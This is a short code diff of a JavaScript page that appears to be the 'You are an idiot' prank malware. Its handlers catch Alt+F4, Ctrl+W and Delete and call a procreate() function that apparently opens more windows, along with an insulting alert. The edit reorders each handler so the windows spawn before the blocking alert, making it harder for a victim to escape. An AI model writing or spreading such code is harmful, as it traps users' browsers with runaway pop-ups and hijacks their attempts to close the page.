@@ -19,9 +19,9 @@ function procreate() {
 	}
 }
 
-function altf4key() { if (event.keyCode == 18 || event.keyCode == 115) { alert("You are an idiot!"); procreate(); } }
-function ctrlwkey() { if (event.keyCode == 17 || event.keyCode == 87) { alert("You are an idiot!"); procreate(); } }
-function delkey() { if (event.keyCode == 46) { alert("You are an idiot!"); procreate(); } }
+function altf4key() { if (event.keyCode == 18 || event.keyCode == 115) {procreate(); alert("You are an idiot!"); } }
+function ctrlwkey() { if (event.keyCode == 17 || event.keyCode == 87) { procreate(); alert("You are an idiot!"); } }
+function delkey() { if (event.keyCode == 46) { procreate(); alert("You are an idiot!"); } }
 
 function newXlt(){
 	xOff = Math.ceil(-6 * Math.random()) * 5 - 10 ;
